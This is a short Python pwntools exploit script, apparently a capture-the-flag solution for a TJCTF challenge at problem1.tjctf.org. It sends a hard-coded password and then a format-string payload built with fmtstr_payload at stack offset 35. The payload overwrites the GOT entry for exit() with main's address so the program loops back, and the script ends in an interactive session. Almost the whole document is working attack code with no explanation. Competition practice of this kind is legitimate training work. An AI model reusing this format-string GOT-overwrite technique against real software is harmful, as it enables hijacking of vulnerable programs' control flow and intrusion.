from pwn import *

def main():
        p = remote("problem1.tjctf.org", 8008)
        exit_got = 0x804A02C
        main_func = 0x8048713
        pwd = "COOL"

        # 1. patch exit()
        print p.recvuntil(">")
        p.sendline(pwd)

        print p.recvuntil(">")
        # payload 35th pos on stack, buf is 40 bytes
        payload = fmtstr_payload(35, {exit_got : main_func})
        p.sendline(payload)

        print p.recvuntil(">")
        p.sendline(pwd)

        p.interactive()

if __name__ == "__main__":
        main()
